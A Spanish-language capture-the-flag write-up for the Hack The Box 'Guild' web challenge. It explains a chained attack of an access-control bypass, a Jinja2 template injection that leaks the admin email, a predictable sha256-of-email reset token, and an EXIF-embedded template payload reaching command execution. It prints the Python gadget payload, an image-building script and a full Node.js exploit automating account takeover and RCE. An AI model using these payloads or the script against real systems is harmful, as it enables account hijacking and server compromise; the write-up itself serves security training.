# Guild — HTB Writeup

## Introducción

El objetivo del challenge Guild es escalar desde un usuario recién registrado hasta ejecutar comandos en el servidor y leer la flag. La aplicación nos recibe diciendo que hay que esperar a que el "Guild Master" (el administrador) nos verifique antes de poder operar, pero esa verificación se puede saltar.

La explotación encadena cuatro vulnerabilidades:

1. **Bypass de control de acceso** para entrar al perfil sin estar aprobados (A01).
2. **SSTI** en el perfil para filtrar el email del administrador (A03).
3. **Reset de contraseña predecible**, con token = `sha256(email)`, para robar la cuenta del admin (A07).
4. **SSTI vía metadatos EXIF** en la verificación del admin, que nos da ejecución de comandos y la flag (A03).

Flag: `HTB{mult1pl3_lo0p5_mult1pl3_h0les_c1965d5f43654b7fbf48fa2b5da3f494}`

---

# 1. Reconocimiento

Recorriendo la aplicación encontramos estas funcionalidades:

- Registro y login (`/signup`, `/login`).
- Una página de verificación donde se sube una imagen de "badge" (`/verification`), y un panel de administrador que aprueba esas verificaciones (`/admin`, `/verify`).
- Un perfil con un campo de "bio" (`/profile`) y un perfil público compartible (`/getlink`, `/user/<usuario>`).
- Recuperación de contraseña (`/forgetpassword`, `/changepasswd/<hash>`).

Apenas nos registramos, la app nos dice que esperemos la aprobación del Guild Master. O sea que existe un usuario administrador (`admin`) al que todavía no tenemos acceso. El objetivo es leer la flag, así que en algún momento vamos a necesitar ejecutar un comando en el servidor.

---

# 2. Cadena de ataque

La explotación completa se resume así:

1. Registrar un usuario normal e iniciar sesión.
2. Subir cualquier imagen en `/verification`. Con eso se habilita `/profile` aunque no estemos aprobados.
3. Poner en la `bio` un payload SSTI que, al abrir `/user/<usuario>`, filtre el email del administrador.
4. Calcular `sha256(email)` para obtener el token de reset del administrador.
5. Disparar `/forgetpassword` y después `/changepasswd/<token>` para cambiarle la contraseña al admin.
6. Iniciar sesión como `admin`.
7. Subir una imagen con un payload SSTI escondido en el metadato EXIF `Artist`.
8. Como admin, pulsar Verify sobre esa imagen. El servidor evalúa el payload y devuelve la flag.

---

# 3. Bypass del control de acceso

El mensaje inicial nos empuja a esperar la aprobación del Guild Master, pero probando el flujo vemos otra cosa:

- Subimos cualquier imagen en `/verification`. La app la acepta y nos dice que la solicitud queda pendiente de aprobación.
- Aun estando pendientes, entramos directamente a:

  ```text
  /profile
  ```

  y la página carga sin problema, dejándonos editar la `bio`.

La conclusión es que la aplicación solo comprueba que hayamos enviado una solicitud de verificación, no que haya sido aprobada. Con eso ya nos saltamos la barrera de la aprobación, que es la puerta de entrada al resto de la cadena (A01 — Broken Access Control).

---

# 4. SSTI para filtrar el email del administrador

En `/profile` se puede editar una `bio`. Al usar "compartir perfil" (`/getlink`) se genera una URL pública:

```text
/user/<usuario>
```

Al visitarla notamos que la `bio` se procesa del lado del servidor. Lo confirmamos con la prueba de siempre:

```text
bio = {{7+7}}   →   /user/<usuario> muestra "14"
```

Como `{{7+7}}` termina dando `14`, tenemos una SSTI sobre un motor Jinja2 (Python).

Probando expresiones para ver qué hay disponible en el contexto de la plantilla, encontramos un objeto que permite consultar la base de datos de usuarios. Lo usamos para leer el email del admin:

```text
{{User.query.filter_by(username='admin').first().email}}
```

Guardamos esa `bio`, volvemos a `/user/<usuario>` y en la respuesta aparece el email real del administrador, por ejemplo:

```text
3466447130736761@master.guild
```

Esto es A03 — Inyección (SSTI).

---

# 5. El filtro de la `bio`

Cuando probamos payloads más agresivos, la app los rechaza con este mensaje:

```text
Avoid Bad Characters!
```

Tanteando de a poco se ve que hay una lista negra que bloquea caracteres y palabras típicas de estos ataques. Por ejemplo el `*`, y los identificadores habituales del gadget de Python que se usa para escalar una SSTI a ejecución de comandos. Esto nos condiciona en dos cosas:

- Usamos `{{7+7}}` y no `{{7*7}}`, porque el `*` está filtrado.
- No podemos leer la flag directamente desde la `bio`.

La expresión que saca el email del admin no cae en ninguna palabra prohibida, así que pasa el filtro tranquila. El gadget que ejecuta comandos lo dejamos para otro punto de la app donde no haya filtro (sección 7).

---

# 6. Reset de contraseña predecible

La contraseña del admin no la conocemos, pero no hace falta romperla porque el sistema de recuperación es débil.

Usamos `/forgetpassword` con nuestro propio email y miramos el enlace de reseteo que genera la app:

```text
/changepasswd/<hash>
```

Comparando ese `<hash>` con el `sha256` de nuestro email, vemos que coinciden:

```text
token = sha256(email)
```

No hay ningún secreto del servidor, ni vencimiento, ni verificación de identidad: el token es una cuenta directa a partir del email. Como el email del admin ya lo tenemos (paso 4), podemos calcular su token nosotros mismos.

El ataque son dos pasos:

1. `POST /forgetpassword` con el email del admin, para que el servidor cree el enlace válido:

   ```http
   POST /forgetpassword
   email=3466447130736761@master.guild
   ```

2. Calcular el token y mandarlo en `/changepasswd/<token>` con una contraseña nueva:

   ```text
   token = sha256("3466447130736761@master.guild")
         = 41925e5fc9de143f66680adad3362a56ace91b04bc04ab93413b996a721cbad7
   ```

   ```http
   POST /changepasswd/41925e5fc9de143f66680adad3362a56ace91b04bc04ab93413b996a721cbad7
   password=pwned123
   ```

Y con eso la cuenta del administrador queda tomada (A07 — Identificación y Autenticación Fallidas, CWE-640).

---

# 7. RCE mediante SSTI en los metadatos EXIF

Ya como administrador, el panel `/admin` lista las verificaciones pendientes, cada una con un botón Verify. Probando con distintas imágenes vemos que al verificarlas el servidor lee sus metadatos EXIF y termina evaluando el campo `Artist` como plantilla, igual que pasaba con la `bio`, pero esta vez sin ningún filtro.

Como acá no hay lista negra, podemos usar el gadget completo de Python. En el campo EXIF `Artist` de una imagen ponemos:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
```

`self` es una variable que Jinja2 siempre deja disponible dentro de la plantilla. Desde ahí se va subiendo por los atributos internos de Python (`__init__` → `__globals__` → `__builtins__`) hasta `__import__`, con el que importamos `os` y corremos un comando del sistema. Eso es ejecución de comandos (RCE).

Al verificar esa imagen como admin, el servidor evalúa el payload y responde:

```text
Verified! HTB{...}
```

De nuevo es A03 — Inyección, pero ahora sin filtro que nos frene.

---

# 8. Preparación de la imagen con payload EXIF

Necesitamos un JPG con el payload en el campo EXIF `Artist` (id `315`). Se arma con Python + Pillow:

```python
from PIL import Image

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}"

img = Image.new("RGB", (10, 10), color="red")
exif = img.getexif()
exif[315] = payload   # 315 = tag EXIF "Artist"
img.save("payload.jpg", exif=exif)
```

Un detalle que nos hizo perder tiempo: si esta imagen se manda por WhatsApp, Discord o similares, esos servicios reprocesan la imagen y le borran los metadatos EXIF, con lo cual el payload se pierde. Para que sobreviva hay que pasarla dentro de un `.zip`. En el `solve.js` la imagen ya va embebida en base64, así que el script no depende de Python ni de Pillow.

---

# 9. Exploit completo

El script `solve.js` hace toda la cadena de una, usando solo módulos nativos de Node (`http` y `crypto`). Arriba se configura el objetivo. Por defecto apunta a la instancia spawneada en la plataforma; para probar contra el Docker local se comentan esas dos líneas y se descomentan las de abajo:

```javascript
// Instancia del CTF
const TARGET = "154.57.164.80";
const PORT   = 31260;

// Para correrlo en local:
// const TARGET = "127.0.0.1";
// const PORT   = 1337;
```

```javascript
#!/usr/bin/env node

const http   = require("http");
const crypto = require("crypto");

const TARGET = "154.57.164.80";   // instancia del CTF
const PORT   = 31260;
// Para correrlo en local: TARGET = "127.0.0.1", PORT = 1337

const rnd  = crypto.randomBytes(3).toString("hex");
const USER = "brk_" + rnd;
const PASS = "Password123";
const MAIL = USER + "@test.com";
const ADMIN_NEW_PASS = "pwned123";

// JPG con el payload SSTI en el EXIF "Artist" (embebido en base64):
//   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
const PAYLOAD_JPG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/4QCCRXhpZgAA...";  // (ver solve.js)

let cookieJar = {};
function cookieHeader() { return Object.entries(cookieJar).map(([k,v]) => `${k}=${v}`).join("; "); }
function storeCookies(res) {
  const set = res.headers["set-cookie"]; if (!set) return;
  set.forEach((c) => { const [p] = c.split(";"); const i = p.indexOf("="); cookieJar[p.slice(0,i).trim()] = p.slice(i+1).trim(); });
}

// Peticion generica: guarda las cookies que setea el server y las reenvia
function request(method, path, { body=null, contentType=null } = {}) {
  return new Promise((resolve, reject) => {
    const headers = {};
    if (contentType)    headers["Content-Type"]   = contentType;
    if (body)           headers["Content-Length"] = Buffer.byteLength(body);
    if (cookieHeader()) headers["Cookie"]         = cookieHeader();
    const req = http.request({ host: TARGET, port: PORT, method, path, headers }, (res) => {
      storeCookies(res);
      let d = []; res.on("data", (c) => d.push(c));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(d).toString() }));
    });
    req.on("error", reject); if (body) req.write(body); req.end();
  });
}
function form(obj) { return Object.entries(obj).map(([k,v]) => encodeURIComponent(k)+"="+encodeURIComponent(v)).join("&"); }
// Arma un cuerpo multipart/form-data para subir la imagen
function multipart(name, filename, buffer) {
  const b = "----guild" + crypto.randomBytes(8).toString("hex");
  const head = `--${b}\r\nContent-Disposition: form-data; name="${name}"; filename="${filename}"\r\nContent-Type: image/jpeg\r\n\r\n`;
  return { body: Buffer.concat([Buffer.from(head), buffer, Buffer.from(`\r\n--${b}--\r\n`)]), contentType: `multipart/form-data; boundary=${b}` };
}

async function main() {
  // Registro + login del broker normal
  await request("POST", "/signup", { body: form({ email: MAIL, username: USER, password: PASS }), contentType: "application/x-www-form-urlencoded" });
  await request("POST", "/login",  { body: form({ username: USER, password: PASS }),            contentType: "application/x-www-form-urlencoded" });

  // Subir imagen con payload EXIF -> crea la verificacion y desbloquea /profile
  const mp = multipart("file", "payload.jpg", Buffer.from(PAYLOAD_JPG_B64, "base64"));
  await request("POST", "/verification", { body: mp.body, contentType: mp.contentType });

  // SSTI en la bio -> filtra el email del admin en /user/<usuario>
  await request("POST", "/profile", { body: form({ bio: "{{User.query.filter_by(username='admin').first().email}}" }), contentType: "application/x-www-form-urlencoded" });
  await request("GET", "/getlink");
  const page = await request("GET", "/user/" + USER);
  const adminMail = page.body.match(/[0-9a-f]+@master\.guild/)[0];

  // Reset de contrasena (token = sha256(email))
  const token = crypto.createHash("sha256").update(adminMail).digest("hex");
  await request("POST", "/forgetpassword", { body: form({ email: adminMail }),        contentType: "application/x-www-form-urlencoded" });
  await request("POST", "/changepasswd/" + token, { body: form({ password: ADMIN_NEW_PASS }), contentType: "application/x-www-form-urlencoded" });

  // Login admin + verificar la imagen (RCE) -> flag
  cookieJar = {};
  await request("POST", "/login", { body: form({ username: "admin", password: ADMIN_NEW_PASS }), contentType: "application/x-www-form-urlencoded" });
  const admin = await request("GET", "/admin");
  const ids = [...admin.body.matchAll(/name="verification_id"\s+value="(\d+)"/g)].map((x) => x[1]);
  for (const id of ids) {
    const r = await request("POST", "/verify", { body: form({ user_id: "1", verification_id: id }), contentType: "application/x-www-form-urlencoded" });
    const flag = r.body.match(/(HTB|flag)\{[^}]+\}/);
    if (flag) { console.log("[+] FLAG: " + flag[0]); return; }
  }
}
main().catch((e) => console.error(e));
```

El archivo `solve.js` de esta carpeta tiene la versión completa, con la imagen en base64 entera y los mensajes de progreso.

---

# 10. Qué hace el script paso a paso

En esta sección se explica qué hace el `solve.js` desde que arranca hasta que imprime la flag.

## El "cookie jar"

Como el flujo pasa por varias pantallas logueadas, el script guarda las cookies que devuelve el servidor y las reenvía en cada pedido. De eso se encargan estas dos funciones:

```javascript
function cookieHeader() { return Object.entries(cookieJar).map(([k,v]) => `${k}=${v}`).join("; "); }
function storeCookies(res) { /* guarda cada Set-Cookie en cookieJar */ }
```

Todas las peticiones pasan por el helper `request(...)`, que arma los headers, adjunta la cookie actual y devuelve `{ status, headers, body }`.

## Paso 1 — Registro y login

```javascript
await request("POST", "/signup", { body: form({ email: MAIL, username: USER, password: PASS }), ... });
await request("POST", "/login",  { body: form({ username: USER, password: PASS }), ... });
```

Se crea un usuario con datos aleatorios (`USER`, `MAIL`) y se inicia sesión. El login devuelve la cookie de sesión, que `storeCookies` guarda para el resto del script.

## Paso 2 — Desbloquear `/profile`

```javascript
const mp = multipart("file", "payload.jpg", Buffer.from(PAYLOAD_JPG_B64, "base64"));
await request("POST", "/verification", { body: mp.body, contentType: mp.contentType });
```

Se sube la imagen. La función `multipart(...)` arma a mano el cuerpo `multipart/form-data` con la imagen decodificada del base64. Esta única subida cumple dos cosas: crea la solicitud de verificación (que es lo que nos habilita `/profile`) y deja subida la imagen con el payload que el admin va a verificar más adelante.

## Paso 3 — Filtrar el email del admin

```javascript
await request("POST", "/profile", { body: form({ bio: "{{User.query.filter_by(username='admin').first().email}}" }), ... });
await request("GET", "/getlink");
const page = await request("GET", "/user/" + USER);
const adminMail = page.body.match(/[0-9a-f]+@master\.guild/)[0];
```

Se guarda la `bio` con el payload SSTI, se genera el link público con `/getlink` y se pide `/user/<usuario>`. El servidor evalúa la plantilla y el email del admin aparece en el HTML; lo sacamos con la expresión regular `/[0-9a-f]+@master\.guild/`.

## Paso 4 — Token de reset

```javascript
const token = crypto.createHash("sha256").update(adminMail).digest("hex");
```

El token es simplemente el `sha256` del email, así que lo calculamos en el momento con el módulo `crypto`.

## Paso 5 — Cambiar la contraseña del admin

```javascript
await request("POST", "/forgetpassword", { body: form({ email: adminMail }), ... });
await request("POST", "/changepasswd/" + token, { body: form({ password: ADMIN_NEW_PASS }), ... });
```

El primer pedido hace que el servidor cree el enlace válido; el segundo, usando el token que calculamos, le pone al admin la contraseña `ADMIN_NEW_PASS`.

## Paso 6 — Entrar como admin

```javascript
cookieJar = {};
await request("POST", "/login", { body: form({ username: "admin", password: ADMIN_NEW_PASS }), ... });
```

Vaciamos el `cookieJar` para no arrastrar la sesión anterior y nos logueamos como `admin` con la contraseña nueva.

## Paso 7 — Verificar la imagen y sacar la flag

```javascript
const admin = await request("GET", "/admin");
const ids = [...admin.body.matchAll(/name="verification_id"\s+value="(\d+)"/g)].map((x) => x[1]);
for (const id of ids) {
  const r = await request("POST", "/verify", { body: form({ user_id: "1", verification_id: id }), ... });
  const flag = r.body.match(/(HTB|flag)\{[^}]+\}/);
  if (flag) { console.log("[+] FLAG: " + flag[0]); return; }
}
```

Se lee `/admin` y se extraen todos los `verification_id` de las solicitudes pendientes. Por cada uno se manda `POST /verify`. Cuando el servidor procesa nuestra imagen, evalúa el EXIF y ejecuta el comando; la respuesta trae la flag, que el script detecta con `/(HTB|flag)\{[^}]+\}/` y la imprime.

---

# 11. Resumen final

La explotación completa consiste en:

1. Registrar un usuario e iniciar sesión.
2. Subir una imagen para desbloquear `/profile` sin aprobación (A01).
3. Inyectar una plantilla en la `bio` para filtrar el email del admin (A03).
4. Calcular `sha256(email)` como token de reset (A07).
5. Cambiar la contraseña del admin y entrar como él.
6. Subir una imagen con el payload SSTI en el metadato EXIF `Artist`.
7. Verificar esa imagen como admin para lograr RCE y leer la flag (A03).

La cadena final es:

```text
Bypass de control de acceso (A01)
        ↓
SSTI en la bio → leak del email del admin (A03)
        ↓
Reset de contraseña predecible sha256(email) (A07)
        ↓
Cuenta de administrador tomada
        ↓
SSTI en el EXIF "Artist" → RCE (A03)
        ↓
FLAG
```
